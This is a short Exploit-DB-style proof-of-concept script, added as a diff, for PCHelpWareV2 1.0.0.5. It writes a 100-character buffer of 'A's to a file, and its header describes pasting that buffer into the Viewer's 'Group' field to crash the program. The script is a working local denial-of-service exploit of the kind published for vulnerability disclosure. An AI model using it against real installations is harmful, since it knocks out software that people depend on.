@@ -1,0 +1,21 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: PCHelpWareV2 1.0.0.5 - 'Group' Denial of Service (PoC)
+# Date: 15/04/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.uvnc.com/home.html
+# Software Link: http://www.uvnc.eu/download/pchw2/PCHelpWareV2.msi
+# Version: 1.0.0.5
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "PCHelpWareV2.py", it will create a new file "PCHelpWareV2.txt"
+# 2.- Copy the text from the generated PCHelpWareV2.txt file to clipboard
+# 3.- Open PCHelpWareV2 Viewer
+# 4.- Go to Properties
+# 5.- Paste clipboard in 'Group' field and click on button 'Ok'
+# 6.- Crashed
+
+buffer = "\x41" * 100
+f = open ("PCHelpWareV2.txt", "w")
+f.write(buffer)
+f.close()
